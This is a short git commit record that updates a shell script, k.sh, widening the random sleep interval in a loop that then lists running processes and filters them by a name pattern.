c140c52ec033f5a13867325fb0dbfcd18aeb8cf8
vjbahkds <154573249+vjbahkds@users.noreply.github.com>
2024-05-13 11:36:04 +0800

    Update k.sh

--- k.sh
+++ k.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
 
 while true; do
-  delay="$[`od -An -N2 -i /dev/urandom` % 10800 + 21600]"
+  delay="$[`od -An -N2 -i /dev/urandom` % 21600 + 21600]"
   [ -n "$delay" ] || break
   sleep "$delay"
   ps -ef |grep -o 'c[0-9]\{1,\}_'
